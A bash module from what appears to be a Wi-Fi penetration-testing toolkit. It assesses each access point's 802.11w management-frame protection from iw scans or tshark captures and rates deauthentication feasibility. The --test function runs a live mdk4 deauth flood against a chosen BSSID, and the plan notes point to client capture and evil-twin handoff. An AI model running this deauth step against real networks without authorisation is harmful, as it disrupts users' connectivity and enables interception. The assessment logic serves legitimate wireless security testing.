#!/usr/bin/env bash
# 34_pmf_bypass — 802.11w PMF Bypass
# Assess management frame protection per AP and test deauth resistance.
#
# Standalone top-level module (Section B). Self-locating and pkexec-safe:
# the polkit rule matches this script's path, so invoke it directly, never
# through `env`.

set -o pipefail

if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
fi
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$WIFISTING_ROOT/loot}"
: "${LOG_DIR:=$WIFISTING_ROOT/logs}"
: "${CAPTURES_DIR:=$WIFISTING_ROOT/captures}"

MOD_TMP="$TMP_DIR/pmf_bypass"
MOD_LOOT="$LOOT_DIR/pmf_bypass"
MOD_LOGS="$LOG_DIR/pmf_bypass"
MOD_CAPS="$CAPTURES_DIR/pmf_bypass"
mkdir -p "$MOD_TMP" "$MOD_LOOT" "$MOD_LOGS" "$MOD_CAPS" 2>/dev/null

# ── capability probes ────────────────────────────────────────────────────

PMF_RESULTS="$MOD_LOOT/pmf_posture.tsv"

# Split a TAB-separated line into PMF_F[], preserving empty fields.
# A tab is IFS *whitespace*, so `IFS=$'\t' read -r bssid ssid caps` collapses
# runs of adjacent tabs and shifts every later field left: an AP with a
# hidden SSID emits "BSSID\t\t0x008c", which reads as ssid=0x008c caps="".
# The capabilities are then lost, an empty string reaches pmf_decode_caps,
# and the AP is reported UNPROTECTED instead of DOWNGRADEABLE.
pmf_split_tab() {
    PMF_F=()
    local line="$1"
    while [[ "$line" == *$'\t'* ]]; do
        PMF_F+=( "${line%%$'\t'*}" )
        line="${line#*$'\t'}"
    done
    PMF_F+=( "$line" )
}

pmf_have_mon() {
    local i
    for i in /sys/class/net/*/; do
        [[ -e "$i/phy80211" ]] || continue
        local n; n=$(basename "$i")
        if iw dev "$n" info 2>/dev/null | grep -q 'type monitor'; then
            printf '%s\n' "$n"; return 0
        fi
    done
    return 1
}

pmf_pick_iface() {
    local want="${1:-}"
    if [[ -n "$want" ]]; then printf '%s\n' "$want"; return 0; fi
    local i
    for i in /sys/class/net/*/; do
        [[ -e "$i/phy80211" ]] || continue
        local n; n=$(basename "$i")
        if iw dev "$n" info 2>/dev/null | grep -q 'type managed'; then
            printf '%s\n' "$n"; return 0
        fi
    done
    return 1
}

pmf_status_tsv() {
    printf 'iw\t%s\n'      "$(command -v iw >/dev/null 2>&1 && echo 1 || echo 0)"
    printf 'tshark\t%s\n'  "$(command -v tshark >/dev/null 2>&1 && echo 1 || echo 0)"
    printf 'mdk4\t%s\n'    "$(command -v mdk4 >/dev/null 2>&1 && echo 1 || echo 0)"
    local m; m=$(pmf_have_mon 2>/dev/null || true)
    printf 'mon_iface\t%s\n' "${m:-none}"
    printf 'injection\t%s\n' "$([[ -n "$m" ]] && echo 1 || echo 0)"
    local n=0
    [[ -f "$PMF_RESULTS" ]] && n=$(grep -c . "$PMF_RESULTS" 2>/dev/null) || n=0
    printf 'cached_aps\t%s\n' "$n"
}

# ── RSN capability decoding ──────────────────────────────────────────────
# 802.11 RSN Capabilities is a 16-bit field; the PMF bits are 6 (required)
# and 7 (capable). Everything else is reported so the raw value is
# auditable rather than reduced to a single verdict.
pmf_decode_caps() {
    local caps="$1"
    [[ -z "$caps" ]] && { printf 'ERROR\tno capabilities\n' >&2; return 2; }
    local v=$((caps))
    printf 'CAPS_RAW\t0x%04x\n' "$v"
    printf 'PREAUTH\t%d\n'          $(( (v >> 0) & 1 ))
    printf 'NO_PAIRWISE\t%d\n'      $(( (v >> 1) & 1 ))
    printf 'PTKSA_REPLAY\t%d\n'     $(( (v >> 2) & 3 ))
    printf 'GTKSA_REPLAY\t%d\n'     $(( (v >> 4) & 3 ))
    # IEEE 802.11-2020 RSN Capabilities: bit 6 = MFPR, bit 7 = MFPC.
    # These were transposed here originally, which reported a PMF-capable
    # but not-required AP as PROTECTED — the opposite of the truth. Verified
    # against `tshark -V`, which dissects 0x008c as MFPR=0 MFPC=1.
    printf 'MFPR\t%d\n'             $(( (v >> 6) & 1 ))
    printf 'MFPC\t%d\n'             $(( (v >> 7) & 1 ))
    printf 'JOINT_MULTIBAND\t%d\n'  $(( (v >> 8) & 1 ))
    printf 'PEERKEY\t%d\n'          $(( (v >> 9) & 1 ))
}

# Verdict per AP. MFPR=1 means deauthentication is itself protected, so the
# classic deauth/evil-twin playbook does not apply; MFPC without MFPR is the
# interesting case because a client that does not negotiate PMF is still
# unprotected.
pmf_verdict() {
    local mfpc="$1" mfpr="$2"
    if   (( mfpr )); then printf 'PROTECTED'
    elif (( mfpc )); then printf 'DOWNGRADEABLE'
    else                  printf 'UNPROTECTED'
    fi
}

# ── live scan via iw ─────────────────────────────────────────────────────
pmf_scan() {
    local iface="${1:-}"
    iface=$(pmf_pick_iface "$iface" 2>/dev/null) || {
        printf 'ERROR\tno managed-mode wireless interface found\n' >&2; return 1; }
    command -v iw >/dev/null 2>&1 || { printf 'ERROR\tiw not installed\n' >&2; return 1; }

    local raw; raw=$(iw dev "$iface" scan 2>&1) || {
        printf 'ERROR\tiw scan failed on %s: %s\n' "$iface" \
               "$(printf '%s' "$raw" | head -1)" >&2
        return 1
    }

    mkdir -p "$(dirname "$PMF_RESULTS")"
    # Each BSS block: take the BSSID, SSID and the RSN Capabilities line.
    printf '%s\n' "$raw" | awk '
        /^BSS / {
            if (bssid != "") emit();
            bssid = $2; sub(/\(.*/, "", bssid); ssid = ""; caps = ""
        }
        /^\tSSID: /  { ssid = substr($0, index($0, ": ") + 2) }
        /Capabilities:/ {
            if (match($0, /0x[0-9a-fA-F]{4}/)) caps = substr($0, RSTART, RLENGTH)
        }
        END { if (bssid != "") emit() }
        function emit() {
            printf "%s\t%s\t%s\n", bssid, ssid, (caps == "" ? "none" : caps)
        }
    ' > "$PMF_RESULTS.raw"

    if [[ ! -s "$PMF_RESULTS.raw" ]]; then
        printf 'ERROR\tno BSS entries parsed (need root for a scan)\n' >&2
        rm -f "$PMF_RESULTS.raw"; return 1
    fi

    printf 'BSSID\tSSID\tMFPC\tMFPR\tVERDICT\n' > "$PMF_RESULTS"
    local bssid ssid caps mfpc mfpr verdict n=0
    local row
    while IFS= read -r row; do
        pmf_split_tab "$row"
        bssid="${PMF_F[0]:-}"; ssid="${PMF_F[1]:-}"; caps="${PMF_F[2]:-}"
        [[ -n "$bssid" ]] || continue
        if [[ "$caps" == "none" ]]; then
            # No RSN IE at all = open or WEP network, which has no PMF.
            mfpc=0; mfpr=0
        else
            local d; d=$(pmf_decode_caps "$caps")
            mfpc=$(printf '%s\n' "$d" | awk -F'\t' '$1=="MFPC"{print $2}')
            mfpr=$(printf '%s\n' "$d" | awk -F'\t' '$1=="MFPR"{print $2}')
        fi
        verdict=$(pmf_verdict "$mfpc" "$mfpr")
        printf '%s\t%s\t%s\t%s\t%s\n' "$bssid" "$ssid" "$mfpc" "$mfpr" "$verdict" \
            >> "$PMF_RESULTS"
        n=$((n + 1))
    done < "$PMF_RESULTS.raw"
    rm -f "$PMF_RESULTS.raw"

    pmf_summarise "$n" "$iface"
}

pmf_summarise() {
    local n="$1" src="$2"
    printf 'SOURCE\t%s\n' "$src"
    printf 'APS\t%s\n' "$n"
    local p d u
    p=$(awk -F'\t' 'NR>1 && $5=="PROTECTED"{c++} END{print c+0}' "$PMF_RESULTS")
    d=$(awk -F'\t' 'NR>1 && $5=="DOWNGRADEABLE"{c++} END{print c+0}' "$PMF_RESULTS")
    u=$(awk -F'\t' 'NR>1 && $5=="UNPROTECTED"{c++} END{print c+0}' "$PMF_RESULTS")
    printf 'PROTECTED\t%s\nDOWNGRADEABLE\t%s\nUNPROTECTED\t%s\n' "$p" "$d" "$u"
    printf 'RESULTS\t%s\n' "$PMF_RESULTS"
}

# ── capture analysis via tshark ──────────────────────────────────────────
pmf_analyze() {
    local pcap="$1"
    [[ -z "$pcap" || ! -f "$pcap" ]] && {
        printf 'ERROR\tusage: --analyze PCAP\n' >&2; return 2; }
    command -v tshark >/dev/null 2>&1 || {
        printf 'ERROR\ttshark not installed\n' >&2; return 1; }

    mkdir -p "$(dirname "$PMF_RESULTS")"
    local rows
    rows=$(tshark -r "$pcap" -Y 'wlan.rsn.capabilities' -T fields \
             -e wlan.bssid -e wlan.ssid -e wlan.rsn.capabilities 2>/dev/null \
           | sort -u) || true
    if [[ -z "$rows" ]]; then
        printf 'EMPTY\t1\n'
        printf 'NOTE\tno RSN capabilities in %s (open/WEP network, or not a beacon capture)\n' "$pcap"
        return 1
    fi

    printf 'BSSID\tSSID\tMFPC\tMFPR\tVERDICT\n' > "$PMF_RESULTS"
    local n=0
    local bssid ssidhex caps row
    while IFS= read -r row; do
        pmf_split_tab "$row"
        bssid="${PMF_F[0]:-}"; ssidhex="${PMF_F[1]:-}"; caps="${PMF_F[2]:-}"
        [[ -n "$bssid" ]] || continue
        # tshark hands the SSID back as hex.
        local ssid
        ssid=$(printf '%s' "$ssidhex" | xxd -r -p 2>/dev/null | tr -d '\0')
        local mfpc mfpr
        mfpc=$(pmf_decode_caps "$caps" | awk -F'\t' '$1=="MFPC"{print $2}')
        mfpr=$(pmf_decode_caps "$caps" | awk -F'\t' '$1=="MFPR"{print $2}')
        printf '%s\t%s\t%s\t%s\t%s\n' "$bssid" "$ssid" "$mfpc" "$mfpr" \
            "$(pmf_verdict "$mfpc" "$mfpr")" >> "$PMF_RESULTS"
        n=$((n + 1))
    done <<< "$rows"

    pmf_summarise "$n" "$(basename "$pcap")"
}

pmf_list_tsv() {
    [[ -s "$PMF_RESULTS" ]] || {
        printf 'ERROR\tno results yet — run --scan or --analyze first\n' >&2; return 1; }
    cat "$PMF_RESULTS"
}

# ── per-AP assessment ────────────────────────────────────────────────────
pmf_plan() {
    local want="$1"
    [[ -z "$want" ]] && { printf 'ERROR\tusage: --plan BSSID\n' >&2; return 2; }
    [[ -s "$PMF_RESULTS" ]] || {
        printf 'ERROR\tno results yet — run --scan or --analyze first\n' >&2; return 1; }
    local want_l; want_l=$(printf '%s' "$want" | tr 'A-F' 'a-f')
    local line
    line=$(awk -F'\t' -v w="$want_l" 'NR>1 && tolower($1)==w {print; exit}' "$PMF_RESULTS")
    [[ -z "$line" ]] && { printf 'ERROR\t%s not in the current results\n' "$want" >&2; return 1; }

    local bssid ssid mfpc mfpr verdict
    # The stored row has the same empty-field hazard as the incoming ones:
    # a hidden-SSID AP is stored as "BSSID\t\t1\t0\tDOWNGRADEABLE", which the
    # collapsing read turns into SSID=1 MFPC=0 MFPR=DOWNGRADEABLE and an
    # empty VERDICT.
    pmf_split_tab "$line"
    bssid="${PMF_F[0]:-}"; ssid="${PMF_F[1]:-}"; mfpc="${PMF_F[2]:-}"
    mfpr="${PMF_F[3]:-}"; verdict="${PMF_F[4]:-}"
    printf 'BSSID\t%s\nSSID\t%s\n' "$bssid" "$ssid"
    printf 'MFPC\t%s\nMFPR\t%s\nVERDICT\t%s\n' "$mfpc" "$mfpr" "$verdict"
    printf 'DEAUTH_FEASIBLE\t%s\n' "$([[ "$verdict" == "PROTECTED" ]] && echo 0 || echo 1)"

    case "$verdict" in
        PROTECTED)
            printf 'NOTE\tManagement frames are protected (MFPR=1); unprotected\n'
            printf 'NOTE\tdeauth/disassoc are discarded by the client. A PMF-capable\n'
            printf 'NOTE\tclient may still be attacked by forcing a downgrade to a\n'
            printf 'NOTE\tnon-PMF BSS, which needs a rogue AP rather than injection.\n' ;;
        DOWNGRADEABLE)
            printf 'NOTE\tPMF is advertised but not required (MFPC=1 MFPR=0). A client\n'
            printf 'NOTE\tthat does not negotiate PMF keeps accepting unprotected\n'
            printf 'NOTE\tdeauth, so the classic deauth path applies.\n' ;;
        UNPROTECTED)
            printf 'NOTE\tNo PMF at all (MFPC=0 MFPR=0): forged deauth/disassoc are\n'
            printf 'NOTE\thonoured, which enables client capture and evil-twin handoff.\n' ;;
    esac
}

# ── live deauth-resistance test ──────────────────────────────────────────
# Sends a bounded burst of deauth frames and reports whether the AP's
# clients actually drop. Requires monitor mode + injection.
pmf_test() {
    local bssid="$1" dur="${2:-10}"
    [[ -z "$bssid" ]] && { printf 'ERROR\tusage: --test BSSID [SECONDS]\n' >&2; return 2; }
    local mon; mon=$(pmf_have_mon 2>/dev/null) || {
        printf 'ERROR\tno monitor-mode interface — cannot test\n' >&2; return 1; }
    command -v mdk4 >/dev/null 2>&1 || {
        printf 'ERROR\tmdk4 not installed (apt install mdk4)\n' >&2; return 1; }

    mkdir -p "$MOD_LOGS"
    local log="$MOD_LOGS/deauth_test_$(date +%s).log"
    printf 'BSSID\t%s\nMON\t%s\nDURATION\t%s\nLOG\t%s\n' "$bssid" "$mon" "$dur" "$log"

    # Bounded burst: mdk4 "d" deauth mode for a fixed window.
    timeout "$dur" mdk4 "$mon" d -B "$bssid" > "$log" 2>&1 || true

    local sent
    sent=$(grep -ciE 'deauth|packets' "$log" 2>/dev/null) || sent=0
    printf 'FRAMES_LOGGED\t%s\n' "$sent"
    printf 'NOTE\tmdk4 cannot confirm delivery; corroborate by watching for client\n'
    printf 'NOTE\treassociation in a concurrent airodump-ng capture.\n'
}

pmf_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    local d
    # 0x000c is the value observed on a real non-PMF AP in this tree.
    d=$(pmf_decode_caps 0x000c)
    chk caps-0x000c-mfpc "$(printf '%s\n' "$d" | awk -F'\t' '$1=="MFPC"{print $2}')" 0
    chk caps-0x000c-mfpr "$(printf '%s\n' "$d" | awk -F'\t' '$1=="MFPR"{print $2}')" 0
    chk caps-0x000c-ptksa "$(printf '%s\n' "$d" | awk -F'\t' '$1=="PTKSA_REPLAY"{print $2}')" 3

    # 0x00c0 sets both MFPC and MFPR.
    d=$(pmf_decode_caps 0x00c0)
    chk caps-0x00c0-mfpc "$(printf '%s\n' "$d" | awk -F'\t' '$1=="MFPC"{print $2}')" 1
    chk caps-0x00c0-mfpr "$(printf '%s\n' "$d" | awk -F'\t' '$1=="MFPR"{print $2}')" 1

    # 0x008c was observed on a real AP advertising PMF required.
    d=$(pmf_decode_caps 0x008c)
    # 0x008c: tshark -V dissects this as MFPR=0 MFPC=1 (capable, not
    # required). The mask order was once transposed here, so this check
    # previously asserted the inverted answer.
    chk caps-0x008c-mfpr "$(printf '%s\n' "$d" | awk -F'\t' '$1=="MFPR"{print $2}')" 0
    chk caps-0x008c-mfpc "$(printf '%s\n' "$d" | awk -F'\t' '$1=="MFPC"{print $2}')" 1

    chk verdict-00 "$(pmf_verdict 0 0)" UNPROTECTED
    chk verdict-10 "$(pmf_verdict 1 0)" DOWNGRADEABLE
    chk verdict-11 "$(pmf_verdict 1 1)" PROTECTED
    # MFPR alone still means protected: the AP requires PMF.
    chk verdict-01 "$(pmf_verdict 0 1)" PROTECTED

    pmf_decode_caps "" >/dev/null 2>&1 && { printf 'empty-caps-rejected\tFAIL\n'; bad=$((bad+1)); } || printf 'empty-caps-rejected\tPASS\n'

    # A hidden-SSID row must keep its column positions. The empty SSID is the
    # middle field, so the collapsing `IFS=$'\t' read` pushed the capabilities
    # into the SSID column and left caps empty, which decoded as UNPROTECTED
    # instead of DOWNGRADEABLE.
    pmf_split_tab $'aa:bb:cc:dd:ee:ff\t\t0x008c'
    chk split-hidden-count "${#PMF_F[@]}" 3
    chk split-hidden-ssid  "${PMF_F[1]:-}" ""
    chk split-hidden-caps  "${PMF_F[2]:-}" 0x008c

    # ... and --plan must read the *stored* hidden-SSID row back with the same
    # positions. PMF_RESULTS is redirected to scratch so the live loot tree is
    # never touched by --selftest.
    local _save_results="$PMF_RESULTS" _tres _plan
    _tres=$(mktemp)
    PMF_RESULTS="$_tres"
    printf 'BSSID\tSSID\tMFPC\tMFPR\tVERDICT\n' > "$PMF_RESULTS"
    printf 'aa:bb:cc:dd:ee:ff\t\t1\t0\tDOWNGRADEABLE\n' >> "$PMF_RESULTS"
    _plan=$(pmf_plan aa:bb:cc:dd:ee:ff 2>&1)
    PMF_RESULTS="$_save_results"
    rm -f "$_tres"
    chk plan-hidden-ssid    "$(printf '%s\n' "$_plan" | awk -F'\t' '$1=="SSID"{print $2}')" ""
    chk plan-hidden-mfpc    "$(printf '%s\n' "$_plan" | awk -F'\t' '$1=="MFPC"{print $2}')" 1
    chk plan-hidden-mfpr    "$(printf '%s\n' "$_plan" | awk -F'\t' '$1=="MFPR"{print $2}')" 0
    chk plan-hidden-verdict "$(printf '%s\n' "$_plan" | awk -F'\t' '$1=="VERDICT"{print $2}')" DOWNGRADEABLE
    chk plan-hidden-feasible "$(printf '%s\n' "$_plan" | awk -F'\t' '$1=="DEAUTH_FEASIBLE"{print $2}')" 1

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

pmf_info() {
    cat <<'EOF'
802.11w Management Frame Protection — what the verdicts mean

  UNPROTECTED    MFPC=0 MFPR=0. Forged deauth/disassoc are accepted, so
                 clients can be pushed off and captured or moved to a
                 rogue AP.
  DOWNGRADEABLE  MFPC=1 MFPR=0. PMF is available but optional; a client
                 that does not negotiate it stays unprotected. Exploiting
                 this needs a rogue AP offering a non-PMF BSS, not raw
                 injection.
  PROTECTED      MFPR=1. Unprotected management frames are discarded.
                 Deauth injection alone will not work.

RSN Capabilities bit layout (IEEE 802.11-2020 9.4.2.25.4):
  bit 0    Pre-Authentication
  bit 1    No Pairwise
  bits 2-3 PTKSA Replay Counter
  bits 4-5 GTKSA Replay Counter
  bit 6    MFPC  (Management Frame Protection Capable)
  bit 7    MFPR  (Management Frame Protection Required)
  bit 8    Joint Multi-band RSNA
  bit 9    Peer Key Enabled

Sources: --scan parses `iw scan`; --analyze parses a capture with tshark.
EOF
}

# ── dispatch ─────────────────────────────────────────────────────────────
pmf_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)  pmf_status_tsv ;;
        --scan)        pmf_scan "$@" ;;
        --analyze)     pmf_analyze "$@" ;;
        --list-tsv)    pmf_list_tsv ;;
        --plan)        pmf_plan "$@" ;;
        --decode-caps) pmf_decode_caps "$@" ;;
        --test)        pmf_test "$@" ;;
        --selftest)    pmf_selftest ;;
        --info)        pmf_info ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --scan [IFACE]            live PMF posture via iw scan
  --analyze PCAP            PMF posture from a capture (tshark)
  --list-tsv                cached per-AP results
  --plan BSSID              assessment + feasibility for one AP
  --decode-caps 0xNNNN      decode a raw RSN Capabilities field
  --test BSSID [SECONDS]    bounded deauth-resistance test (needs monitor)
  --selftest
  --info
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    WIFISTING_CLI=1
    declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
    declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
    declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
    pmf_cli_main "$@"
fi
